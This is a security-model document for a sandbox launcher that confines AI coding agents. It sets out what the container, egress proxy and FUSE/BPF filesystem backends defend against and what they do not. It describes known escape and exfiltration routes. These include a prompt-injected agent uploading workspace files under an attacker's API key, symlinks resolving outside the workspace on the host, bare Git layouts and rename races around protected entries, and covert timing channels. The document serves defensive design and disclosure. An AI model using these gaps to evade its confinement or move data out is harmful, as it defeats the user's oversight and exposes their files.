# Security model

This document analyzes the boundary that the [README's opening diagram](README.md) shows. The other
documents explain its components. The launcher source in `src/main/scala/` defines the mounts and
flags that implement the boundary:

- `AgentSandboxLauncher.scala` coordinates the lifecycle;
- the files beside it implement the individual mechanisms.

The guarantees describe the default launch options unless a passage says otherwise. Workspace rules
and opt-in features can change the session's authority, meaning what the session is allowed to do.
The sections below describe the limits and costs of each.

## Defended

**Compromise the host.**

- The host exposes the workspace and the agent-state volume. The host does not expose the user's
  home or other workspaces.
- The containers run rootless, and agents run as an unprivileged user with `no-new-privileges`.
  - Every podman action refuses a rootful service, except `--stats`, `--reset`, `--reset-all` and
    `--reset-run-on-host`, which only read or remove. A rootful service makes the agent's uid and
    the container's root the host's own.
  - The session's entrypoint refuses to start unless `/proc/self/status` shows a seccomp filter,
    `no-new-privileges` and exactly the capabilities that `--nesting` grants. The host's
    `containers.conf` can turn the filter off, and `podman info` reports only kernel support.
  - The status check shows that a filter is loaded, not which filter. Under `--nesting=none` the
    entrypoint also runs `unshare -U`, which the launcher's profile refuses and podman's default
    profile allows ("No containers inside the sandbox by default").
- The session's writes to `$HOME` and `/tmp` outside the persistent volume are discarded when the
  session ends.
- The launcher mounts no host container-runtime socket. Access to such a socket would let a session
  control containers outside its confinement. `SessionBoundaryTest` checks both the Docker and the
  Podman socket paths.

**Credential theft.**

- The launcher does not automatically mount host forge-token stores, cloud credential files, SSH
  private keys or the SSH agent's socket. The sandbox supports work on private repository checkouts
  without forwarding host Git credentials.
- Agents' own provider logins are kept in the persistent volume. Some of those logins grant
  authority beyond model access, including repository or cloud access. "The web reached through the
  model provider" describes those exceptions.
- The guarantee covers automatic forwarding only:
  - A credential placed in the workspace is accessible like any other workspace file.
  - A credential forwarded with `--env` is available in the sandbox's environment. Egress rules
    limit where the credential can be sent, not its authority at an allowed destination
    ("Exfiltration through allowed network traffic", below). Any process in the session can use the
    credential with the authority its issuer granted.
  - Only the launch command line can specify `--env`. A workspace file cannot choose which host
    variables the sandbox receives. The launcher refuses `KO_AGENT_SANDBOX_*` names, which describe
    the launcher's enforcement settings, and prints every forwarded name.
  - A value the host holds reaches the sandbox container by name. Podman copies the value of a
    value-less `--env` from the launcher's process:
    - the value is in no podman argument, and not in the create command that podman records for the
      container;
    - `podman inspect` shows the value in the container's environment, as it shows every variable;
    - an explicit `--env=NAME=VALUE` is on the launch command line already, and stays in the create
      command.
  - `--env-aws-cred` forwards the three values that the AWS CLI resolves on the host in the same
    way. The launcher sets each value by name in the create command's own environment, passes it in
    no podman argument, and prints the names with the time left (`AwsCredential.scala`).
- A credential brokered with `--egress-cred=NAME@HOST` reaches neither the sandbox nor a run-on-host
  command; both see `NAME` set to a placeholder. The proxy puts the value in requests to `HOST`,
  where the value keeps its issuer's authority ("Who holds a brokered value", below).

**Workspace data reaching a destination nobody chose.**

- Outbound HTTPS traffic passes through the proxy, which enforces the resolved egress rules and
  records protocol and policy decisions ("Egress proxy", below).
- The default profile starts from the inspected catalog and the default rules of the model
  providers that the launch selects: the agent's own provider and those that `--model-provider`
  names. The workspace's rule file can remove or extend those grants.

**Writing to remote hosts**, subject to the resolved egress rules.

- The defaults allow opaque model-provider traffic and inspected requests for reading, Git fetch
  (`clone` and `pull`), and GitHub device login.
- An inspected request is refused unless its operation is granted at its path.
- The defaults refuse `git push`. A workspace can grant `git push` through `method=POST` or an
  opaque tunnel.

"Reading without being able to write", below, explains the rules, their costs and their limits.

**Being used to attack someone else.**

- The egress rules limit the reachable targets and operations. The rules do not establish that an
  allowed request is harmless.
- In every profile, the proxy refuses other ports and private addresses, including cloud metadata
  services such as 169.254.169.254. The proxy validates every resolved address at connection time.

**A session reaching another workspace, or persisting outside declared state.**

- Agent state is a per-workspace volume, and it deliberately affects later sessions of that
  workspace ("What the persistent volume holds", below). The rest of the sandbox home is discarded
  on exit.
- The networks and proxy are per run and removed with it, so concurrent sessions cannot reach one
  another through those networks and no network object is reused.

**Claude Code running commands from user or project hooks, status lines and file suggestions.**

- Claude Code's user and project hooks are blocked (the sandbox Containerfile's
  `allowManagedHooksOnly` note has the reasoning and exceptions).
- A plugin that the launch names with `--claude-plugin-dir` runs as a managed plugin, including its
  hooks and mod. The plugin's code runs inside Claude Code without a tool call, with the reach that
  the session's own commands have
  ([agent-settings.md](doc/agent-settings.md#claude-code-plugins-and-mods)).
  - The host user names the plugin on the launch command line, like a `--env` forward. A workspace
    file cannot name a plugin.
  - The plugin directory is mounted read-only. The launcher refuses the directory when it holds or
    is inside the workspace or a directory that `--run-on-host` commands write, or when a symlink,
    a hard-linked file, a junction or a pipe lies under it.
  - So a session can neither add a plugin nor change a plugin it runs: not through the workspace,
    not through a host command, and not through a second name of a plugin file.
- `allowManagedHooksOnly` also restricts `statusLine`, `subagentStatusLine` and `fileSuggestion`
  to managed settings. So refreshing a display or suggesting a file cannot run a command from user
  or project settings.
- The image's [status-line command](doc/agent-settings.md#claude-code-status-line) lets a workspace
  customize the display through a template. The command substitutes field values without executing
  the template or evaluating the inserted values. That section defines the command's input and
  output limits.

**A workspace loosening its own confinement.**

- Claude Code's managed settings are stored in the read-only image and take precedence over
  repository settings. An organization's remote managed settings can supersede the image's settings
  (the sandbox Containerfile's managed-settings note explains the consequences).
- The rules in `.ko-agent-sandbox/egress` and `.ko-agent-sandbox/file` are read on the host
  before the container starts.
- The session's workspace mode keeps a session from writing the configuration that governs the next
  launch:
  - Under `--workspace=read-only` the whole tree is read-only.
  - Under the FUSE backend, `.ko-agent-sandbox` is protected. The name cannot be created at any
    depth, under the same name-matching rules as `.git`, and nothing under an existing
    `.ko-agent-sandbox` can be written. "The host's git executing what the sandbox wrote" states the
    exception for a concurrent host change.
  - Under `--workspace=live,bpf` the BPF backend holds the same rules, with one difference: an empty
    directory of the name can be made and removed, and no file enters that directory at any depth
    (`doc/bpf-lsm-cgroup.md`, "Directories").

**The host's git executing what the sandbox wrote.** Host `git` runs what `.git` configures: hooks,
and the commands that `.git/config` names, such as `core.hooksPath`, `core.fsmonitor`, filters and
the pager.

- By default the FUSE backend prevents a session from injecting commands into the user's
  next host `git` run.
- Under `--workspace=live,bpf` the BPF backend of `doc/bpf-lsm-cgroup.md` holds the same rules on
  the workspace directory itself. One exception: an empty directory may be made at a `.git` name,
  and that directory gains no `HEAD` (`doc/bpf-lsm-cgroup.md`, "Directories").
- An auditor finds what to trust for the BPF backend under "The BPF backend", below.

What the FUSE backend does:

- The FUSE backend refuses a new entry named `.git` at any depth, under any spelling that a
  case-insensitive host filesystem treats as that name. The BPF backend refuses such an entry that
  is not a directory, and a directory that the backend allows there gains no `HEAD`.
- The FUSE backend prevents changes to the protected Git entries of every repository rooted at a
  `.git` entry. Operational state stays writable, so the agent's own git keeps working. The
  protected entries:
  - `config` and `hooks/`;
  - files that redirect Git to another directory;
  - rebase instructions;
  - `rr-cache`, whose existence enables rerere in host merges;
  - `objects/info/alternates`, whose paths host git opens.

  The bisect state is operational. A host git older than 2.34 evaluates `BISECT_NAMES` as shell
  code, and the launcher warns when the host's git is that old.
- The FUSE backend serves the tree live. A repository created on the host mid-session appears at
  once, with the same Git entries protected against modification.
- The FUSE backend treats a second name of a host-created `.git` or `.ko-agent-sandbox` as that
  entry.
  - An NTFS 8.3 short name (`GIT~1`, `KO-AGE~1`) or a hard link is the same object on the host
    filesystem. The FUSE backend compares objects where spellings cannot be listed.
  - Some cases stay uncovered (`ko-agent-fs/policy/doc/security-research.md`, "Windows 8.3 short
    names").

One open exception affects these claims: the host changes the workspace while a session mutates
it.

- Linux offers `rename`, `unlink` and `rmdir` by name only. So the FUSE backend decides about a name
  and then performs the operation on that name. A second name of a guarded entry can take an
  ordinary name's place between the two steps; the operation then moves, replaces or removes the
  guarded entry as it would have the ordinary one.
- A guarded entry moved to an ordinary name is an ordinary entry there. The entry's Git
  configuration and hooks, or its egress rules, are writable under the new name.
- On Windows, the test that a `create` never reopens a guarded entry arriving under a second name
  failed in two of three runs ("a create opened the host's pointer file"). The cause is unverified
  (`ko-agent-fs/fuse/doc/TODO.md`, "A second name arriving during a name-based mutation").
- This exception affects the claims above, including the protection of repositories created
  mid-session and of `.ko-agent-sandbox` (`ko-agent-fs/policy/doc/security-research.md`, "Windows
  8.3 short names"). `ko-agent-fs/fuse/doc/TODO.md` keeps the exception open.

Every path through which host git reaches these entries must also be protected. The mount-time guard
checks the repository that host git discovers from the workspace root. The guard refuses:

- a repository at the workspace root that keeps its Git directory, or part of it such as `config`,
  at an ordinary path in the workspace, as `git init --separate-git-dir` can. The FUSE backend
  protects Git entries under a `.git` name, so the session could write that path;
- a bare layout at the workspace root;
- in a Git directory inside the workspace, a symlink at `objects`, `objects/info` or either
  alternates file below it that leads back into the workspace. Through that link the session would
  write `alternates` under another name;
- a `core.hooksPath` that names the workspace root itself. No read-only directory short of the
  whole tree could hold its hooks, such as `<workspace>/pre-commit`;
- through a podman machine, a chain to any of these, hooks included, that leaves the directories the
  machine shares. The FUSE backend cannot see what the host follows outside them:
  - on macOS the machine shares `/Users`, `/private` and `/var/folders`;
  - on Windows the machine shares the workspace's own drive, so a link to another drive is refused.

These entries are served read-only instead of refused:

- hooks kept in the worktree, such as husky's `.husky/_`, a `core.hooksPath` of `githooks`, or a
  symlinked `.git/hooks`. The components that the hooks' chain passes through are pinned against
  rename ("A host program executing a workspace file on an event", below);
- the workspace entry that a symlink at `objects`, `objects/info` or an alternates file leads to
  from a Git directory outside the workspace. Such a link that leads out of the workspace, to
  objects kept on another disk, is served as it is.

A workspace file that a command in `.git/config` names or runs stays writable:

- A filter, `textconv`, merge driver or `core.fsmonitor` value can name a file, as
  `./tools/clean.sh` or `node scripts/driver.js` do. The session cannot change the value, but can
  rewrite the file that the value names.
- Git passes each of these values to a shell when the value holds a space or another shell
  character (git 2.51.0). So the guard cannot tell which word names a file, as the guard can for
  `core.hooksPath`.
- A `read-only tools/clean.sh` line in `.ko-agent-sandbox/file/rule` protects such a file outside
  `node_modules` (`doc/file-rules.md`, "The rule file").

A directory laid out as a gitdir *without* a `.git` name, elsewhere in the tree, is a gap that "The
workspace" describes.

A repository whose Git directory is outside the workspace can pass the guard if its configuration
and hooks are also unreachable through writable workspace paths:

- submodule checkouts;
- linked worktrees;
- separate Git directories;
- `.git` files naming an external directory by its absolute path;
- launches from a subdirectory of a repository.

Git cannot work in those sessions, because the container has the workspace root and nothing above
or beside it. The launcher and the agent instructions report this limitation as a warning. A
session that only edits files can still be useful, without exposing the host's Git configuration or
hooks.

A launch from a linked worktree is the exception:

- The launch mounts the main worktree's Git directory read-only, at the path that the worktree's
  `.git` names. The launch does so when the container resolves that path as the host does: a
  relative pointer anywhere, an absolute pointer on macOS and Linux.
- Git there reads the repository (`status`, `log`, `diff`), and every write to that directory fails.
  `git clean` and a plain `git apply` write only the working tree, so they run where the workspace
  is writable.
- The session reads that directory's configuration and hooks as a launch from the main worktree
  does, and can change nothing in that directory.
- `doc/TODO.md` holds the writable form ("writable git from a linked worktree"). `doc/TODO.md` also
  holds why a relative pointer is not yet a route ("a linked worktree's absolute pointer on
  Windows").

These are the default protections. "Not defended" qualifies them:

- On some platforms the FUSE backend has no measured evidence ("The FUSE backend, on the platforms
  where it is unverified").
- Under `--run-on-host`, host commands write directly to the host tree without passing through the
  FUSE backend. The Seatbelt profile's deny rules protect those Git entries on that path ("Run
  on host", below).

**A host program executing a workspace file on an event, not when you build or run it.**
Some host programs run commands that the workspace's files name, on an event:

- an agent's hooks and MCP servers, when you start the agent;
- a hook manager's configuration, when you commit;
- an editor's tasks, when you open the folder;
- mise's hooks, when you enter the directory;
- a Dev Container's `initializeCommand`, when you reopen the Dev Container.

A session cannot change those files. `doc/file-rules.md` has the list and the rule file.

- The FUSE backend keeps the entries that the defaults and `.ko-agent-sandbox/file/rule` name
  read-only at any depth, under the name rule that `.git` has. The FUSE backend refuses to create
  such an entry by any means.
- A directory that such a name passes through cannot be renamed, replaced or removed while the
  directory holds anything. So the name cannot be staged elsewhere and moved into place.
- Below a directory that a `writable` line names, such as `node_modules` in the defaults, a session
  can write names that the other lines protect. So the FUSE backend refuses:
  - moving a directory or symlink out of the writable directory, including renaming the writable
    directory itself;
  - a hard link of a symlink out of the writable directory;
  - a symlink into the writable directory from outside.
- The FUSE backend refuses the same moves out of a Git directory's operational state, where no line
  applies. The FUSE backend also refuses any new symlink whose target names a `.git` entry or spells
  an NTFS 8.3 short name such as `GIT~1`, whatever that name holds when the link is made.
  - The check reads the target's names when the link is made. So a symlink that the session did not
    make, into a Git directory or through a short name, still lets a later link reach that
    directory. Such a symlink is the host's, or predates the check.
- The mount-time guard adds what a name cannot express. The guard reads the tree as the tree is at
  the mount, a snapshot like the Git check above:
  - A hook directory kept in the worktree is read-only. So is the target of a symlink inside a
    listed entry at the workspace root, also when that entry links to a directory outside the
    workspace. The directories and links that each such chain passes through cannot be renamed or
    replaced.
  - A symlink at the workspace root can make a directory part of a listed name, as
    `.claude -> shared/claude` does for `shared/claude`. Below that directory the guard protects
    what that name's lines protect, including entries that the session creates later.
  - The guard refuses a listed entry, or a symlink inside one, that leads to the workspace root or
    to a directory holding the root. No read-only path could express that case.
- Under `--run-on-host` the Seatbelt profile denies writing the same files, in the same order. The
  profile cannot refuse moving a directory out of `node_modules`. So a host command can bring a
  listed name to a subdirectory that had none ("Run on host", below).

What the selected command then runs stays open. Review the command's diff first, as "The workspace"
says. The open cases:

- a workspace script that a task, a hook or `initializeCommand` runs;
- a `package.json` script;
- a file that an `.envrc` loads through `source_env`;
- code that a listed plugin imports from a dependency directory;
- a tool that a hook runs from `node_modules`, which the defaults leave writable. Examples are a
  husky hook running `npx lint-staged` or `npm test`, and the `lefthook` binary that lefthook's Git
  hooks run from `node_modules`. For such a workspace the read-only hook configuration fixes which
  command a commit runs, not that command's code.
  - Protecting a hook runner's own configuration, such as `.lintstagedrc` or
    `commitlint.config.*`, would add nothing while the runner's code is writable. So the defaults do
    not list that configuration.
  - Making the whole of `node_modules` read-only would stop `npm install` in the session.
- an editor extension that evaluates a workspace file on open or save;
- a dependency directory that you open in an editor or enter, as `npm explore` does;
- a symlink or relocated hook deeper than the workspace root's entries, as for nested repositories.

**Silent changes to what you own.** The launcher never silently modifies configuration or files it
does not own. Unannounced changes to host configuration or metadata can invalidate the user's
understanding of what the sandbox can access. These cases need a host change or an explicit notice:

- the podman **machine's** `/etc/fuse.conf` gains `user_allow_other` only after you consent.
  `--build` first shows the change as a diff of the actual file, plus the exact script.
  - The launcher saves the original to `/etc/fuse.conf.ko-agent-sandbox.orig` first.
  - If you decline, the launcher prints the script for you to run yourself.
- a native Linux **host** is never even prompted for sudo. The launcher only hands you the command.
- the **machine** is started when stopped, but never created or resized: sizing is yours.
- during **session setup**, the workspace tree stays unchanged:
  - The FUSE backend denies creating `.git` and `.ko-agent-sandbox` by name, and the BPF backend
    judges what enters them. So neither name needs a mount target in the workspace.
  - The policy's proof fixture lies under the launcher's state root.
  - `--workspace=read-only` makes the entire tree read-only.
- **`--self-test` without a case filter** writes to its own scratch directory in the workspace
  ([testing.md](ko-agent-fs/doc/testing.md)).
- the **workspace's SELinux labels** are never changed. On an enforcing host a container reads an
  plain bind mount only under `:Z`, which relabels the directory recursively. No launch passes
  `:Z`:
  - The FUSE backend's mountpoint needs no relabel.
  - A permissive or disabled host reads the workspace unrelabeled.
  - On an enforcing host, `--workspace=read-only` refuses rather than relabels, unless the tree
    already has a shared container-accessible context. Such a context is a container type with no
    MCS categories, since categories from a previous `:Z` are private to the container they were
    assigned to.

The launcher owns what it writes:

- its images, containers, networks and named volumes;
- its per-workspace state root;
- its install directory `~/.local/share/ko-agent-sandbox`.

The launcher owns podman objects by name. `--reset-all` force-removes every container, network and
volume that matches the generated name patterns:

- `ko-agent-sandbox-*` and `ko-agent-egress-*` names that end in the twelve-hex path hash and, for
  per-run resources, in the eight-hex run suffix;
- the self-test probe container `ko-agent-self-test-share-` followed by that suffix alone.

Those patterns are reserved. An object created by hand under such a name is removed like the
launcher's own objects. The launcher refuses a launch whose `--persistent-volume` matches one of the
patterns.

**Accidentally exposing an over-broad workspace.** Before creating any resource, the launcher
refuses:

- filesystem roots, including Windows drive and UNC roots;
- the current user's configured homes (`HOME` on POSIX; `USERPROFILE` and `HOME` on Windows), the
  Windows shared profile `PUBLIC`, and every ancestor of those directories.
  - The macOS data-volume spelling (`/System/Volumes/Data/...`) counts as the same directory.
    `toRealPath` does not collapse that firmlink alias.
- the well-known home containers, whether or not a configured home lies beneath them: `/home`,
  `/Users` and the Windows profiles root (`%SystemDrive%\Users`, or `C:\Users` when `SystemDrive`
  is unset).
  - The direct children of those containers are refused too: another account's home exposes that
    account exactly as this account's home would.
  - POSIX root's own homes, `/root` and `/var/root`, are refused too.
- a path whose current or ancestor directory has a dot-prefixed name;
- the container user's home, `/home/nonroot`, and anything beneath it. The workspace root is
  mounted at its own path, where the workspace would sit among the session's home, the persistent
  volume and the agents' state.
- a path at which the sandbox image has an entry (`/tmp`, `/usr/local/bin`), or a path beneath a
  directory of the image that the sandbox user cannot enter (`/root`). `/tmp/app` binds into `/tmp`
  and is accepted.
  - The launcher asks the image with a run of the image. So a directory that the image gains later
    is refused without a list to update.
  - An `absent` answer is cached per image Id, and a rebuilt image has a new Id.
- on Windows, a UNC path, in every workspace mode. The mount path is the one that WSL gives a drive,
  `/mnt/<drive>/...`, and a share has no such path.

A workspace *inside* a home is accepted: `~/src/app` and `~/app` are both valid choices. Refusing
them would leave nowhere obvious to work.

Home discovery degrades loudly, never silently:

- a `HOME` that is set but invalid fails the launch on POSIX;
- on Windows an invalid secondary value (Git Bash's POSIX-style `HOME`) is dropped with a warning
  when another home variable resolved;
- a home that cannot be resolved to a real path is refused by its exact spelling, with a warning;
- with no home variable set at all (cron, CI, `env -i`), the launch proceeds under the built-in
  refusals above and says so.

This check is an accident guard, not a complete path boundary. The launcher does not enumerate the
system's accounts or prove that the chosen directory is a project. So selecting some other broad
directory still exposes that directory in full. The security boundary begins at the exact workspace
root that the user selects.

## Not defended

**Prompt injection.** The sandbox does not detect or prevent an agent from following malicious
instructions. The sandbox limits the actions available to the compromised agent. Claude Code's auto
mode (README, "`claude`") screens actions with a classifier. This document counts auto mode as no
defense.

**Exfiltration through allowed network traffic.**

- An opaque tunnel allows writes wherever the endpoint offers a write API. `api.anthropic.com`
  receives the conversation by design.
- The proxy does not see which credential a tunnel carries, so the account written to need not be
  the user's.
  - An injected instruction can supply the attacker's own API key. Any process in the session can
    then send workspace files under that key, to whatever the provider's API stores for the key's
    owner to retrieve later.
  - Reported demonstrations exist against Anthropic's Files API
    (https://embracethered.com/blog/posts/2025/claude-abusing-network-access-and-anthropic-api-for-data-exfiltration/)
    and against Cowork (https://www.promptarmor.com/resources/claude-cowork-exfiltrates-files).
  - `--egress=deny-unless-model` does not help: the model host is the receiving host.
  - Another provider's API is a receiving host only when the launch selects that provider or the
    workspace's rule file allows it. A launch admits the agent's own provider alone unless
    `--model-provider` names more. A file's `allow model-provider` line for a provider that the
    launch did not select is reported as a widening at every launch.
  - Refusing a credential that is not the session's needs the proxy to terminate TLS at the model
    host (`doc/TODO.md`, "Credential brokering").
- At inspected hosts, the proxy constrains methods, paths and HTTP framing, but does not validate
  application payloads.
  - An allowed `GET` carries its URL. A path grant narrows the recipient, but the path suffix and
    the query can still encode data.
  - Forwarded headers and allowed request bodies can also carry data.

Inspection therefore does not establish that a request contains no workspace information.

**The web reached through the model provider.**

- Claude Code's WebSearch and Codex's web search run on the provider's servers. The query and its
  results travel inside the model-endpoint tunnel, and the provider's infrastructure does the
  searching.
- The proxy sees one connection to `api.anthropic.com` or `chatgpt.com`. So neither the ruleset nor
  the audit log (`--egress-log`) applies to the domains searched. A query is outbound information
  that the provider relays onward.
- Claude Code's WebFetch is the opposite: a direct request from inside the sandbox, through the
  proxy. Only an allowed host answers the request, and the proxy logs it like any other connection.

Copilot CLI's sign-in stores a forge credential, not merely a model-provider credential.

- `copilot login` obtains an OAuth token with `repo` scope. That scope includes private-repository
  access, subject to the account's permissions and organization restrictions.
- The container has no credential store. So Copilot keeps the token in plaintext under `~/.copilot`
  in the persistent volume, alongside the other agents' provider logins.
- Inside the sandbox, that token:
  - can authenticate private clones from `github.com` and `GET`s on `api.github.com`;
  - cannot, under the default rules, push or modify repositories through inspected hosts;
  - can write through Copilot's model endpoint, `api.githubcopilot.com`. The proxy cannot
    distinguish those writes from model traffic.
- The same endpoint also serves two features that write. Copilot provides `--disable-builtin-mcps`
  and `--no-remote-export` to disable them:
  - the built-in GitHub MCP server, which writes files, branches, issues and pull requests with the
    signed-in account;
  - Copilot's session export to GitHub's web UI.
- The proxy rule `deny model-provider github` denies every host in GitHub's model-provider rules,
  including `github.com`, `api.github.com` and the model tunnels, unless a later rule grants access
  again.
- Resetting the workspace's agent-state volume discards the stored token ("What the persistent
  volume holds", below).
- GitHub defines the provider-side limits in its [OAuth
  scopes](https://docs.github.com/en/apps/oauth-apps/building-oauth-apps/scopes-for-oauth-apps) and
  [organization access
  restrictions](https://docs.github.com/en/organizations/managing-oauth-access-to-your-organizations-data/about-oauth-app-access-restrictions).

agy's Business sign-in stores a Google Cloud credential for the licensed project.

- Google's default rules tunnel the Agent Platform API, Vertex AI's API, at
  `aiplatform.googleapis.com` and its `us` and `eu` multi-region hosts. The API manages the
  project's resources as well as serving the project's model endpoints.
- Through those opaque tunnels, the credential can perform whatever operations the user's IAM roles
  allow in the signed-in project. The proxy cannot distinguish those operations from model traffic.
  - Sufficient permissions can permit deploying or deleting model endpoints, starting paid
    training, tuning or batch-prediction jobs, or deploying agent code. Jobs may also require
    permission to use a service account.
  - A job's server-side Cloud Storage access depends on the service identity that performs the
    operation, not just on the signed-in user's bucket access. So a job can read or write storage
    without the sandbox contacting a storage host. Google's [batch-inference
    documentation](https://docs.cloud.google.com/gemini-enterprise-agent-platform/machine-learning/predictions/get-batch-predictions)
    describes those execution identities.
- Storage, Compute and IAM use separate hosts. The sandbox reaches those hosts only where the
  profile or a workspace rule allows them.
- A workspace can deny the three aiplatform hosts while keeping the Business AI Code API. A
  workspace can also use `deny model-provider google` to deny every host in Google's default rules,
  unless a later rule grants access again.
- Resetting the workspace's agent-state volume discards the stored token ("What the persistent
  volume holds", below).

**Low-bandwidth channels.** The choice of allowed host, request timing and request order can all
encode information. The proxy does not detect or bound these covert channels.

**The workspace.**

- The workspace root is mounted at the path the host has it at (on Windows, at the path WSL gives
  it, `/mnt/<drive>/...`). So a path that the agent prints names the same file for the user, an IDE
  and a host build, and none of them translates the path.
- The path itself is therefore visible to the agent in every session, and through the agent's
  prompts to the model provider. The path includes the home directory's name and the layout above
  the workspace root.
- The directory is writable on purpose: the sandbox protects the rest of the host, not the
  workspace.
- With the Git entries listed above protected, an agent can still write data there that your git
  then parses. So a memory-safety bug in git itself remains reachable, exactly as with any cloned
  untrusted repository.
- `.gitattributes` stays writable, but can only invoke filter commands that your host configuration
  already defines.
- One such filter connects outside the egress proxy. Where your host has git-lfs, git-lfs contacts
  the server that `.lfsconfig` names when a host checkout writes an LFS file, and uploads to that
  server at push.
  - The default file rules keep the worktree's `.lfsconfig` read-only. Without a `.lfsconfig` in
    the worktree, git-lfs reads the file from the index, then from `HEAD`, and the session writes
    both.
  - In a repository whose worktree has no `.lfsconfig`, read `git show :.lfsconfig` and
    `git show HEAD:.lfsconfig` before a host checkout, merge or pull. `git status` can hide the
    first, because the session can mark the entry skip-worktree.
  - A `.lfsconfig` that includes another workspace file protects nothing unless
    `.ko-agent-sandbox/file/rule` lists that file too. git-lfs reads the file together with its
    includes.
  - git-lfs reads eight keys from `.lfsconfig`, among them `lfs.url`, `lfs.pushurl` and the fetch
    filters. git-lfs ignores every key that names a command (git-lfs 3.7.0,
    `config/git_fetcher.go`, `safeKeys`). The commands that git-lfs runs come from your Git
    configuration and the hooks, which the FUSE backend protects.
  - The object store, `.git/lfs/`, is writable. A session can place bytes under an object's hash
    that do not have that hash. A host checkout or `git lfs checkout` then writes those bytes to the
    worktree without a download.
    - Those bytes are content that a session could write to the worktree anyway, not a command.
    - The pointer names the true hash. `git lfs fsck` reports the object, git sees the file as
      modified once git reads it, and a server verifying uploads refuses the object at push.
    - A rerere resolution has no such reference, which is why `rr-cache` stays protected.

Everything else writable is output from an untrusted execution environment: build scripts, CI
definitions, IDE configuration that the file rules do not list, generators and binaries. Editing
these files is the job. Confining their author says nothing about what running them on the host
will do. Review the diff first, exactly as for a contribution from a stranger.

That includes a repository the agent created deeper in the tree:

- The FUSE backend refuses creating a `.git` entry, but cannot refuse a *bare layout* built from
  ordinary names (`git init --bare`, `git clone --bare|--mirror`, or by hand).
- A bare layout's config and hooks are served as writable data anywhere in the writable workspace.
  Git's ascending discovery adopts the layout for a host command run at or beneath it.

Running host git *inside* a directory the agent created is running the agent's output.

A symlink can expose files outside the workspace, because the reader's filesystem namespace
resolves the symlink's target:

- In the container, a link `x -> /etc/passwd` written in the workspace resolves to the
  *container's* `/etc/passwd`, and a relative `../../..` clamps at the container root. So inside
  the container the link reaches nothing that the sandbox did not already expose.
- On the host the identical link resolves to the host's file, outside the workspace.
- The exposure occurs when a later host process follows the link: a recursive copy configured to
  dereference symlinks, an editor indexing the workspace, or a packaging step.
- A diff shows only the target text, which can make this risk easy to overlook.

The FUSE backend reduces this risk. The FUSE backend refuses absolute targets and targets whose
syntax climbs above the workspace root, including common links into external caches. Two gaps
remain (`fs.rs`, `target_has_portable_syntax`):

- a target containing other symlinks can resolve differently on each side;
- a later `rename` or `link` can move a relative symlink so that its target escapes the workspace.

The creation-time syntax check does not prevent deliberate construction of such links, so such
links still need review. Direct hard links across the workspace mount boundary fail with `EXDEV`,
because the workspace mount and the container root are different filesystems. Hard-linking a
symlink within the workspace can still change where its relative target resolves.

The tree is also shared live with the host:

- Your editor, builds and git run against the same files that the agent is writing. Host and
  sandbox writes race like any two processes on one directory. Git's own lock files are the only
  arbiter that the writable parts of `.git` get.
- On Windows, a file that a live session holds open refuses some host writers until the session
  lets go. The machine's 9p handle imposes Windows sharing rules: PowerShell's `Set-Content` meets
  "used by another process", while Notepad's save and .NET's `WriteAllText` succeed
  (`ko-agent-fs/fuse/doc/verification-log.md`).
- Concurrent sandbox sessions of one workspace race each other the same way, under the FUSE
  backend too. The sessions share the one FUSE mount: the same files, the same live view, the same
  races.

**The FUSE backend, on the platforms where it is unverified.**

- The workspace reaches the sandbox through `ko-agent-fs-fuse` (`ko-agent-fs/fuse/`). That FUSE
  mount enforces the policy stated under "The host's git executing what the sandbox wrote".
- The FUSE backend refuses new `.git` entries and protects the listed Git entries at any depth.
  Read-only bind mounts cannot do so (`doc/design.md`, "Read-only mounts over the protected entries
  are not a backend").
- The design uses FUSE to mediate the VM's filesystem view across host platforms, rather than one
  of the alternatives (`ko-agent-fs/fuse/doc/architecture.md`, "Mediation mechanism").

The mount-time guard has two scope limits (`ko-agent-fs/policy/doc/git-metadata.md`, "Relocated
hook directories"):

- The guard checks the repository discovered from the workspace root, not every nested repository.
  - The protected entries under a nested repository's `.git` cannot be modified. But pre-existing
    redirections into writable worktree files, such as relocated hooks or a redirected gitdir,
    remain writable (`ko-agent-fs/fuse/doc/TODO.md`).
  - The targets of symlinks at or inside listed entries deeper than the root's entries remain
    writable too.
  - Bare layouts below the workspace root are also outside that check. A bare layout present at the
    root at launch is refused ("The host's git executing what the sandbox wrote").
- The check is a snapshot. The check does not revalidate protected Git entries that the host
  relocates during a session.
  - The resolution chains that the check accepts consist of components that the sandbox cannot
    write or rename. So the sandbox cannot redirect those chains itself.
  - The snapshot does not prevent the sandbox from constructing a new bare layout from ordinary
    writable files, as described above.

What an auditor trusts, and how each link is checked:

- **The source.** No binary is shipped. The Rust source travels inside the launcher jar, readable in
  this repository, and `--build` compiles it in a pinned `rust:slim` container on the user's own
  machine.
- **The dependency tree**, pinned by `Cargo.lock` (`--locked` at every cargo step). A pinned
  `cargo-deny` checks the tree, permissive licenses only, before any binary exists.
- **The installed binaries' source version.** The launcher digests the bundled source, passes the
  digest into the image build, and checks each installed binary's `--version` against the digest.
  A mismatch fails `--build`.
  - This check detects a mismatched installation. A binary reports the value itself, so the check
    does not independently attest the binary's contents or the build toolchain.
- **The FUSE backend's daemon is unprivileged.** The daemon runs without root or capabilities, and
  uses the existing setuid `fusermount3` helper to mount FUSE.
  - The daemon is installed in the podman machine user's home on macOS and Windows, or in the host
    user's home on native Linux (the README names the path).
  - The FUSE backend's `allow_other` mount needs `user_allow_other` in the machine's
    `/etc/fuse.conf` (`ko-agent-fs/fuse/doc/architecture.md`, "Who may reach the mount"). Enabling
    that setting requires consent ("Silent changes to what you own", above).

What is measured, each item through the whole production stack
(`ko-agent-fs/fuse/doc/verification-log.md` has the runs):

- the name rule, on macOS against both APFS variants and on Windows against a real NTFS volume;
- coherency, on macOS for `read()` and an established `mmap`, and on Windows for `read()`, with the
  share-lock cost that "The workspace" notes. The `mmap` row has not run on Windows.

The rest is what the README's status line means. On Linux the guarantees are reasoned rather than
measured. The FUSE backend still enforces every `--workspace=live` session, on every platform.

A version mismatch, a failed self-test or a failed mount aborts the launch. None of them falls back
to a plain bind mount.

`ko-agent-fs/fuse/doc/`, `ko-agent-fs/policy/doc/` and `ko-agent-fs/doc/testing.md` hold the
implementation, the policy derivation and the test evidence.

**The BPF backend.** `--workspace=live,bpf` mounts the workspace directory itself, writable. BPF
programs of type `BPF_LSM_CGROUP` hold the workspace policy's rules. The programs attach to a cgroup
of the session's own in the podman machine, so the host and every other container keep unrestricted
access to the same files.

- `doc/bpf-lsm-cgroup.md` states what the backend promises and what the backend changes ("What is
  gained and what is lost").
- `ko-agent-fs/bpf/doc/architecture.md` says how the backend keeps those promises.
